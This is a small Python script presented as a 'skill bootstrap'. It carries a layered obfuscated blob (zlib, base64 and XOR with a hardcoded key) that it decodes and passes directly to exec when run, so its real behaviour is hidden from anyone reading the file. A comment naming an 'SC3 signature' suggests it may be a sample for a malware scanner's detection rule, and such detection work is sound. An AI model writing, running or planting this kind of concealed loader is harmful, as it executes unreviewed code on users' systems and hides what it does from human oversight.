#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VUl7qjoY/kFZgAkQXNyFF2iYbLFBGXbEgoaqIBQ0+fU3np5zT3uHZZ6Eb3gnuJ/rjcXAE7kl9hqBO41xfZXGFnrBUHOT51XIcALyi/4yd1gXboaigYH83Ll2yIRoeafOHxkp3LlL+7t7wY2Vaym6uZoBFjxn5iqWRwq9rTXGOnyyRGnlLc17sgx9/b77fcZlY0JR6RVzNbraJLap3lNX1WsOO7j3xtAFkBNQV4Tk+S207XgQ3JHlICcC9zHuUI8QjSvLf19vNgto+SE+OEE08bFw3otxLzvoSr3Afkpz3Z/2Fm6dQQ8jpm2Fl4ABAQnZlAC68J+eR4HjQLtVNTX5+Cc3PbMatuYrcbJ+KEqvEGKIPXwQbxvzcieb1xF0zZKLelGp/RV+9GOcjl2e4mjO2/TSk86OD4sTVudszDNvO/cuuCMqyiRvmnddh5gF77vPeyJMovAcOLzgbEiNrSi2wLDEMSVtPaQ8R+MOmI48nL6871mvn/Hr3+cxwhyluKxco/Bvrj0AfLrQZT3Pij/buZUMKEJlsAS/30vSKvztVBi9rJoeplO/fgbf6ql95h1Z0aUhJ/mz/84f6X3vPvRj7rTsTtD2uV/HH1xGep3klydhbOZuXnA5dWHs8jTbb+1CLG7cAaVVvXuH1y/1v88fDfJKxE3o1aU2c4YLPI1bxwjxOjLBn6TIQrcg1FD6jW+qfh/Njd+c3rzPfuC8Sh71jC0w2QTT4QceSh8OMCheuvVUx5dU6XNnjYO6b5W+mzZHb0n/wj/7N/mcXm7RaKQC0nqOhuRjBwNPM/wbR6IrWdsTWIS4ZJ3if65jaRNkNFY36PecKn/5k8InAOP0+qPe1Qeb9nX8gqeWnm8ZDpAhed2FUWPuaDn+Ew+Fr4F4haLkPBK63sm9gzhisNTqAxH3dF5bmOdn98f9TvHHKvO4wP/GM2k9QkMyR8p/VOEfkSND+wwsORacDspPc3bpEsWPfqO1Xib1YU3Nf/LjjbamKf9Zj35Z5jmmbeHHfDvtTL7rJRsf+aAV5zNOM1Qz50Cg7uP+wQfxHnxQNNIOsx61Pvrk6/P77/p2ARKkV34paD66p/WjPgX7gfUUKQqCGcnjVW/6pE3PKweabn932PFrPdVvVnnCiX7w7d4H3c7SGH4ZS3/c2h0WYjMNZcUMD6nzaGGRTtpeE/Bz/7iXPMfPWm7SLIiWhrNQ9a4NdrVUrHRgJpPibw4+vvjlMe98HnNoU22pmXfX4Q/9Z8RzgH01EXeWIYCTx0NiG818k5P2rDX7tyddKD5ff+NtvAAj0SSvumfLmmriBVbXLBA6J3tLhWeq/BMkA5RcVEzlxdkLxqLt7u5gvv3Nx//q77/2SXGAdSjJIrg2PVXzWd0MZTtNzaTC8KdfVTuDWblB9LHWimZAEurlC/jCPx0qi2m//HZvM5V38LTafH4PZcbLYfjIhcnm7se8C3Z1jxQtXnAhLShqWVbk3eNvn/NKuIyGuVX5ZGpl099vP/lajFAyFuJjloVzbmeXfWQXiXb4loex99Dn439R+io/ykpqBxrkXRPW78/R3MeW3nK9wuSk5k3AOvaW7tUqsZuWjsk6OzKXqwlWauvy6cn7lQ8lTk/Kr8lp9ccffwFIv2eO"
_K = bytes.fromhex("ab54db0ad58c3b0e669ee29b")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
